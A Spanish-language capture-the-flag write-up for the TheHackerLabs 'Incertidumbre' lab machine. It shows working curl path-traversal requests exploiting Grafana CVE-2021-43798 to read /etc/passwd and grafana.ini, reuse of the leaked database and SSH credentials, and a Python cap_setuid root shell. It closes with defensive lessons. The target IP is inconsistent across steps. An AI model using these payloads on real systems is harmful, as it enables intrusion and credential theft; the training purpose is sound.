---
title: "TheHackerLabs - Avanzado : [Incertidumbre]"
date: 2024-11-26 08:15:00 +0200
categories: [CTF, Writeups]
tags: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
image: /img/posts/CTF/incertidumbre/incertidumbre.png
---


📛 **Nombre:** Incertidumbre | 📈 **Dificultad:** Avanzado | 💻 **SO:** Linux | 👨‍💻 **Creador:** @Oskitaar90

---


# 🕵️ Resolución del CTF Incertidumbre

El **CTF Incertidumbre** es un reto avanzado diseñado para poner a prueba habilidades de enumeración, explotación y escalada de privilegios en un entorno Linux. La máquina cuenta con servicios expuestos y configuraciones específicas que, al ser explotadas correctamente, permiten al jugador obtener acceso root.

Este CTF fue diseñado especialmente para la comunidad de [**TheHackersLabs**](https://thehackerslabs.com/){:target="_blank"}, con un agradecimiento especial a **CuriosidadesDeHackers** y **Condor** por su constante apoyo e inspiración.

---


## 🌐 Entorno Inicial

- **IP de la máquina:** `10.0.2.15`
- **Servicios principales detectados:** 
  - **22/tcp - SSH:** OpenSSH 8.2p1 (Ubuntu Linux)
  - **80/tcp - HTTP:** Apache/2.4.41 (Ubuntu)
  - **3000/tcp - HTTP:** Grafana v8.2.0
- **Herramientas utilizadas:** Nmap, MySQL, SSH, Python.


---

## Enumeración

### 🚪 Escaneo de Puertos
Para resolver este CTF, vamos a realizar un escaneo completo de puertos para identificar los servicios expuestos en la máquina objetivo. Utilizamos Nmap con el siguiente comando:

```bash
sudo nmap -sSCV -p- -Pn -n --min-rate 5000 192.168.1.48 10.0.2.15

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:72:6f:9a:ba:7f:73:1d:bc:30:36:ee:9d:62:e8:88 (RSA)
|   256 cd:0b:5b:55:41:13:bc:1c:d1:27:81:77:ff:6d:33:15 (ECDSA)
|_  256 63:29:44:28:7d:5a:db:39:29:47:2f:a5:1d:17:fc:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)

3000/tcp open  ppp?

```



**🛠️ Resultados del escaneo:**  
El escaneo nos devuelve la siguiente información sobre los servicios activos:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:72:6f:9a:ba:7f:73:1d:bc:30:36:ee:9d:62:e8:88 (RSA)
|   256 cd:0b:5b:55:41:13:bc:1c:d1:27:81:77:ff:6d:33:15 (ECDSA)
|_  256 63:29:44:28:7d:5a:db:39:29:47:2f:a5:1d:17:fc:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?

```

**🔍 Análisis de resultados:**

- **Puerto 22 (SSH):**
  - Detectamos un servicio **OpenSSH 8.2p1**, lo que nos indica que el sistema operativo es **Ubuntu**.
  - Aunque no es explotable de forma directa en este momento, podría ser útil más adelante.

- **Puerto 80 (HTTP):**
  - Este puerto aloja un servidor **Apache 2.4.41**, pero el acceso inicial devuelve un **403 Forbidden**.
  - Esto sugiere posibles restricciones de acceso o configuraciones específicas que se deben investigar más adelante.

- **Puerto 3000 (Grafana):**
  - Identificamos un servicio que, tras una breve investigación, confirmamos que es **Grafana**.
  - Este será clave para la próxima fase del reto.



**🔍 Intento de investigación en el puerto 80:**

Probamos obtener más información sobre el servicio en el puerto 80 utilizando herramientas como WhatWeb y curl, pero no logramos extraer nada relevante debido al estado 403 Forbidden:
```bash
└──╼ $whatweb 10.0.2.14
http://10.0.2.14 [403 Forbidden] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.0.2.14], Title[403 Forbidden]
```

```bash
└──╼ $curl -I 10.0.2.14
HTTP/1.1 403 Forbidden
Date: Mon, 25 Nov 2024 19:24:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

```
**Comentario:** A pesar de estos intentos, no obtenemos información útil desde el puerto 80. Por lo tanto, vamos a centrar nuestra atención en el puerto 3000, donde encontramos el servicio Grafana.

**🌟 Resultado principal:**
El escaneo nos permitió identificar un servidor Grafana en el puerto 3000, que será el próximo objetivo de nuestra investigación. Además, detectamos un servidor HTTP en el puerto 80, pero este no nos proporciona datos útiles, y un servicio SSH en el puerto 22 que podría ser relevante más adelante.


---



### 🛠️ Explotación

#### 📂 1. LFI en Grafana

La versión de Grafana detectada en el puerto `3000` es la **v8.2.0**, que es vulnerable al **Local File Inclusion (LFI)** identificado como **[CVE-2021-43798](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798)**.

**¿Qué es este CVE y qué hace?**  
Este CVE describe una vulnerabilidad en Grafana que permite a un atacante sin autenticación acceder a archivos arbitrarios en el servidor a través de la explotación de un fallo en las rutas. Esto significa que, utilizando rutas específicas en el navegador o mediante herramientas como `curl`, podemos obtener archivos confidenciales del sistema operativo subyacente o de la propia aplicación.

> **Nota:** Esta vulnerabilidad es crítica porque no requiere autenticación, lo que la convierte en un vector de ataque inicial muy poderoso en sistemas mal configurados.

---

#### 📜 Archivos obtenidos:

Aprovechando esta vulnerabilidad, conseguimos extraer dos archivos clave del sistema:

1. **/etc/passwd:**  
   Contiene información sobre los usuarios registrados en el sistema, incluyendo los nombres de usuario que podríamos utilizar en fases posteriores.

   ```bash
   └──╼ $curl --path-as-is http://10.0.2.14:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
   ```
![Imagen de /etc/passwd](</img/posts/CTF/incertidumbre/etcpasswd.png>) 

2. **/etc/grafana/grafana.ini:**  
   Este archivo es el principal de configuración de Grafana. Al analizarlo, descubrimos credenciales para conectarnos a la base de datos del servicio.

   ```bash
   └──╼ $curl --path-as-is http://10.0.2.14:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini

   ```
![Imagen de /etc/passwd](</img/posts/CTF/incertidumbre/databasegr.png>) 

---

#### ✍️ Comentario:

El **LFI** nos permitió obtener credenciales almacenadas en texto plano dentro del archivo `grafana.ini`. Estas credenciales serán clave para conectarnos a la base de datos interna y avanzar en la explotación. Además, el archivo `/etc/passwd` nos brinda información valiosa sobre los usuarios del sistema.

> **Próximo paso:** Utilizaremos las credenciales extraídas para investigar la base de datos de Grafana y buscar más puntos de explotación.

---





### 🛠️ 2. Acceso a la Base de Datos

Con las credenciales extraídas del archivo `grafana.ini`, accedemos al servidor MySQL remoto, donde se encuentra la base de datos de Grafana.

```bash
mysql -h 10.0.2.14 -u grafana -p
Enter password:

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.39-0ubuntu0.20.04.1 (Ubuntu)

MySQL [(none)]>
```

---

#### 🔍 Exploración de la base de datos

1. Listamos las bases de datos disponibles:
   ```sql
   show databases;
   ```

   **Resultado:**
   ```
   +--------------------+
   | Database           |
   +--------------------+
   | grafana_db         |
   | information_schema |
   | mysql              |
   | performance_schema |
   | sys                |
   +--------------------+
   ```

2. Seleccionamos la base de datos `grafana_db` y listamos sus tablas:
   ```sql
   use grafana_db;
   show tables;
   ```

   **Resultado:**
   ```
   +----------------------------+
   | Tables_in_grafana_db       |
   +----------------------------+
   | users                      |
   | org_user                   |
   | api_key                    |
   | dashboard                  |
   ... (más tablas) ...
   ```

3. Consultamos la tabla `users` para obtener posibles credenciales:
   ```sql
   select * from users;
   ```

   **Resultado:**
   ```
   +---------+--------------------------------+
   | usuario | passwd                         |
   +---------+--------------------------------+
   | cloud   | b0KjQXwH801dm2vnOgP2anEc8JGidc |
   +---------+--------------------------------+
   ```

---

#### ✍️ Análisis y conexión SSH

¿**Recordamos** que previamente obtuvimos el archivo `/etc/passwd` mediante el LFI en Grafana? En ese archivo identificamos al usuario `cloud` con la siguiente configuración:

```
cloud:x:1001:1001::/home/cloud:/bin/bash
```

Esto nos indicó que el usuario `cloud` tiene acceso a una shell Bash (`/bin/bash`). Más adelante, al consultar la tabla `users` en la base de datos de Grafana, obtuvimos las siguientes credenciales asociadas al usuario `cloud`:

- **Usuario:** `cloud`
- **Contraseña:** `b0KjQXwH801dm2vnOgP2anEc8JGidc`

Combinamos esta información y probamos conectarnos al servidor mediante SSH con éxito:

```bash
ssh cloud@10.0.2.14
```

**Salida:**
```
The authenticity of host '10.0.2.14 (10.0.2.14)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

cloud@TheHackersLabs-Incertidumbre's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

Last login: Fri Oct 18 17:35:25 2024 from 192.168.18.48
cloud@TheHackersLabs-Incertidumbre:~$ whoami
cloud
cloud@TheHackersLabs-Incertidumbre:~$ pwd
/home/cloud
```

Estamos dentro como el usuario `cloud`. Este acceso inicial nos permite explorar el sistema y buscar posibles métodos de escalada de privilegios.


> **Próximo paso:** Analizar los permisos y configuraciones del usuario `cloud` para identificar vías de escalada a root.










## 🚀 Escalada de Privilegios

### 1. 🕵️ Script sospechoso y sudoers

Al conectarnos por SSH con las credenciales extraídas, comprobamos los permisos sudo del usuario `cloud`:

```bash
sudo -l
```

**Salida:**
```
sudo: unable to resolve host TheHackersLabs-Incertidumbre: Temporary failure in name resolution
Matching Defaults entries for cloud on TheHackersLabs-Incertidumbre:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User cloud may run the following commands on TheHackersLabs-Incertidumbre:
    (ALL) NOPASSWD: /usr/local/bin/set_date.sh
```

Aunque se nos permite ejecutar el script `/usr/local/bin/set_date.sh` como root, no podemos leer su contenido directamente debido a las restricciones de permisos:

```bash
cat: /usr/local/bin/set_date.sh: Permission denied
```

Esto nos obliga a explorar otras opciones.

---

### 2. 🛠️ Capabilities y Python

Indagando más a fondo, investigamos las capacidades del sistema utilizando `capsh`:

```bash
capsh --print
```

**Salida parcial:**
```
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,...,cap_setuid,...
Ambient set =
Securebits: 00/0x0/1'b0
...
uid=1001(cloud) euid=1001(cloud)
```

Aquí notamos que el sistema tiene habilitada la capacidad `cap_setuid`, lo que nos permite explorar si algún binario puede ser utilizado para ejecutar comandos con privilegios elevados.

Comprobamos las capacidades específicas de Python en el sistema:

```bash
getcap /usr/bin/python3.8
```

**Salida:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
```

Este resultado confirma que el binario de Python tiene la capacidad `cap_setuid`, lo que nos permite cambiar el ID de usuario efectivo (`UID`) del proceso y, por lo tanto, obtener una shell como root.

---

### 3. ⚡ Escalando privilegios con Python

Utilizamos Python para ejecutar una shell con privilegios de root:

```bash
python3
```

Dentro del intérprete de Python, ejecutamos los siguientes comandos:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Resultado:**
```
root@TheHackersLabs-Incertidumbre:~# whoami
root
```

¡Somos root! Ahora tenemos control total del sistema.

---

### ✍️ Reflexión final

Este CTF nos lleva a reflexionar sobre varias malas prácticas comunes en sistemas que, combinadas, pueden comprometer la seguridad de un servidor:

1. **Almacenamiento de contraseñas en archivos de configuración:**  
   La inclusión de credenciales en texto plano, como las que encontramos en el archivo `grafana.ini`, facilita el acceso no autorizado. Es fundamental utilizar gestores de secretos seguros para evitar este tipo de exposiciones.

2. **Vulnerabilidades conocidas y falta de actualizaciones:**  
   Grafana en su versión **v8.2.0** tiene una vulnerabilidad de **LFI** (CVE-2021-43798). Este tipo de fallos se corrige mediante actualizaciones regulares. Mantener el software actualizado es una línea de defensa clave.

3. **Errores de configuración en capacidades:**  
   La capacidad `cap_setuid` en Python permitió escalar privilegios de manera sencilla. Limitar estas capacidades únicamente a binarios estrictamente necesarios es esencial para reducir el riesgo de escaladas de privilegios.

4. **Scripts con permisos elevados sin seguridad adecuada:**  
   Permitir la ejecución de scripts como root sin validaciones ni restricciones abre puertas para abusos. Este tipo de configuraciones deben ser revisadas y, en su caso, eliminadas o reemplazadas por mecanismos más seguros.

En resumen, este reto muestra cómo la combinación de vulnerabilidades en software, errores de configuración, y malas prácticas de seguridad puede convertir un sistema en un objetivo vulnerable. La lección más importante es la necesidad de seguir buenas prácticas y mantener la seguridad como una prioridad constante.

---

## 📚 Recursos y Referencias

- [Nmap](https://nmap.org)
- [CVE-2021-43798: Grafana LFI](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [MariaDB/MySQL Official Documentation](https://mariadb.com/kb/en/documentation/)

---
